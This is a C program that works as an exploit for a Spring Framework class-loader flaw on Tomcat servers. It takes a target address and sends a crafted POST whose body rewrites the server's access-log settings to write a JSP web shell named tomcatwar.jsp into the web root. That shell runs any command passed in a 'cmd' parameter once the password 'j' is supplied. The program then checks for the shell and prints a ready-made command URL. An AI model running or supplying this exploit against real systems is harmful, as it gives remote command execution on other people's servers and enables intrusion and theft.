#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h> // write()

#include <arpa/inet.h>
#include <resolv.h> // res_query()
#include <netdb.h>  // struct hostent, gethostbyname()

#define MAX_BUFFER 4096

void
die(const char *fmt, ...)
{
	va_list ap;

	int errno_saved = errno;

	va_start(ap, fmt);
	vfprintf(stdout, fmt, ap);
	fprintf(stdout, "\n");
	fflush(stdout);

	if (errno_saved != 0) {
		fprintf(stdout, "(errno = %d) : %s\n", errno_saved,
			strerror(errno_saved));
		fprintf(stdout, "\n");
		fflush(stdout);
	}

	va_end(ap);

	exit(EXIT_FAILURE);
}

// Returns 1 if the response status is 2XX else 0.
//
// NOTE: This function calls `die()` on error.
int
http_client_is_ok(const char *url, int server_port, const char *suburl, const char *method,
		  const char *headers, const char *data)
{
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) {
		die("Error while creating the socket!");
	}

	/* // get address from url */

	/* struct hostent *host_info = gethostbyname(url); */
	/* if (host_info == NULL) { */
	/* 	die("Couldn't get address"); */
	/* } */

	/* struct in_addr *address_in_addr = */
	/* 	(struct in_addr *)(host_info->h_addr_list[0]); */
	/* char *address = inet_ntoa(*address_in_addr); */

	struct sockaddr_in servaddr = { 0 };
	servaddr.sin_family         = AF_INET;
	servaddr.sin_port           = htons(server_port);

	if (inet_pton(AF_INET, url, &servaddr.sin_addr) <= 0) {
		die("inet_pton error for %s", url);
	}

	if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) <
	    0) {
		die("connect failed!");
	}

	// We're connected. Prepare the message.
	char sendline[MAX_BUFFER];
	sprintf(sendline, "%s %s HTTP/1.1%s%s\r\n\r\n%s", method, suburl,
		headers ? "\n" : "", headers, data);

	// Send the request
	int sendbytes = strlen(sendline);
	if (write(sockfd, sendline, sendbytes) != sendbytes) {
		die("write error");
	}

	// Now read the response
	/* char recvline[11] = { 0 }; // enough to get the 1st digit of status code */
	char recvline[30] = { 0 }; // enough to get the 1st digit of status code
	int  n            = read(sockfd, recvline, sizeof(recvline) - 1);
	if (n < 0) {
		die("read error");
	}
	printf("= RECVLINE FOR %s %s %s =\n%s\n= RECVLINE END =\n\n", url, suburl, method, recvline);

	if (recvline[9] == '2') { // 9th index is the first digit of status code
		return 1;
	}
	return 0;
}

// Returns 1 and stores the exploit url to `exploit_url` if the vulnerability
// exists.
int
exploit(const char *url, char *exploit_url)
{
	const char *headers =
		"suffix: %>//\n"
		"c1: Runtime\n"
		"c2: <%\n"
		"DNT: 1\n"
		"Content-Type: application/x-www-form-urlencoded\n"
		"Content-Length: 762";
	const char *data =
		"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=";

	if (http_client_is_ok(url, 80, "/", "POST", headers, data)) {
		printf("POST request on url '%s' successful\n", url);
	} else {
		printf("[WARNING] POST request on url '%s' failed\n", url);
	}

	if (http_client_is_ok(url, 80, "/tomcatwar.jsp", "GET", NULL, NULL)) {
		sprintf(exploit_url, "%s/tomcatwar.jsp?pwd=j&cmd=whoami", url);
		return 1;
	}
	return 0;
}

int
main(int argc, char **argv)
{
	if (argc != 2) {
		fprintf(stderr, "Usage: %s url\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	char *url = argv[1];

	char exploit_url[MAX_BUFFER];
	int  is_vulnerable = exploit(url, (char *)&exploit_url);

	if (is_vulnerable) {
		printf("The vulnerability exists, the shell address is:\n%s\n",
		       exploit_url);
	} else {
		printf("The vulnerability does not exists\n");
	}

	return EXIT_SUCCESS;
}
